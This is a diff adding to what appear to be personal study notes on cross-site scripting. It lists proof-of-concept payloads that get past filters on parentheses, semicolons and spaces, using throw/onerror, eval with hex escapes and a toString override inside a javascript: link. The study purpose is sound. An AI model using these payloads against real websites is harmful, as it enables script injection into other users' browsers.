@@ -40,10 +40,35 @@ Example payload:
 
 The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. The
 
-
 Example payloads when the target context is inside JavaScript part of the HTML ( <script></script>):
 -> '-alert(document.domain)-'
 -> ';alert(document.domain)//
 
 * If single quotes are escaped, backslashes should also be esaceped. Assuming the target context is within the JavaScript part.
+
+* Sometimes WAF or server side code restricts some characters such as paranthesis. In this case we can make use of throw to bypass it.
+Example payload:
+-> <script>onerror=alert;throw 1337</script>
+
+* If semicolons are restricted as well as paranthesis, we can use the following payload:
+-> <script>{onerror=alert}throw 1337</script>
+
+* Another payload is where we can do them at the same time. The last arguement is sent to alert and onerror assignment must be before this arguement.
+-> <script>throw onerror=alert,'some string',123,'haha'</script>
+
+* In some cases of throwing exceptions, browsers may add "uncaught" as prefix. To bypass it, we can use a payload similar to:
+-> <script>{onerror=eval}throw'=alert\x281337\x29'</script>
+
+Another interesting payload is:
+-> &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
+* This payload is used to inject XSS into <a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d1'}).finally(_ => window.location = '/')">Back to Blog</a>
+
+Explanation of this payload:
+-> throw/**/onerror=alert,1337 is used to call alert in case of an exception with arguement 1337. Here we use /**/ instead of a space character since space character may be escaped as a prevention.
+-> We make it as a lambda function x
+-> We equate (override) the built-in JavaScript function toString to the lambda function we have just defined.
+-> We use window + '' to call toString. Here, window object is not a string. Therefore, it will cause to call toString function, which is actually our lambda function.
+
+
+
 
